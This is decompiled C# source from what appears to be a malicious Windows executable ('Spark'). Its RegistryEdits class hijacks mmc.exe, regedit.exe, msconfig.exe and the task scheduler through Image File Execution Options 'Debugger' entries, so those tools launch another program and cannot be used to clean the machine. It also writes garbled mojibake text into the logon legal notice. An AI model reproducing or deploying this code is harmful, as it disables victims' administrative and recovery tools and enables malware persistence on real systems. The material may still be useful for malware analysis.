// Decompiled with JetBrains decompiler
// Type: Spark.RegistryEdits
// Assembly: Spark, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2DFB06E8-4427-4218-A5F6-F5DE139079B1
// Assembly location: C:\Users\adriel\Downloads\Spark\Chris@Spark.exe

using Microsoft.Win32;

#nullable disable
namespace Spark;

internal class RegistryEdits
{
  public static void ImageFileExecutionOptions()
  {
    RegistryKey subKey1 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\mmc.exe");
    subKey1.SetValue("Debugger", (object) Variables.IFEOApplication);
    subKey1.Close();
    RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\regedit.exe");
    subKey2.SetValue("Debugger", (object) Variables.IFEOApplication);
    subKey2.Close();
    RegistryKey subKey3 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\msconfig.exe");
    subKey3.SetValue("Debugger", (object) Variables.IFEOApplication);
    subKey3.Close();
    RegistryKey subKey4 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\taskschd.msc");
    subKey4.SetValue("Debugger", (object) Variables.IFEOApplication);
    subKey4.Close();
  }

  public static void GeneralChanges()
  {
    RegistryKey subKey1 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    subKey1.SetValue("legalnoticecaption", (object) "æœºè\u00BD¦ªç§»¶†µæ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹æœºè\u00BD¦ªç¶†µ…®¸‡æ«ºè\u00BD¦ç¶†µ…®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹æœºè\u00BD¦ªç§»åŠ¨¦ç¶†µ…®¸ä¸‹˜Ž‹¿¤‰‹Ÿ„‘ä¨¦ç¶†µ…®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹è\u00BD¦ªç§»åŠ¨¦®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹");
    subKey1.Close();
    RegistryKey subKey2 = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
    subKey2.SetValue("legalnoticetext", (object) "æœ¦ªç§»åŠ¨¦ç¶†µ…®¸‡æ«˜Ž¿¤‰‹Ÿ„‘ä¸‹æœºè\u00BD¦ªµ…®¸‡æœºè\u00BD¦ªç§»åŠ¨¦ç¶†µ…®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹æœºè\u00BDåŠ¨¦ç¶†µ…®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ºè\u00BD†µ…®¸‡æ«˜Ž‹¿¤‰‹Ÿ„‘ä¸‹ªç§»åŠ¨¦ç¶†µ…®¸‡æ«˜‹Ÿ„‘ä¸‹");
    subKey2.Close();
  }
}
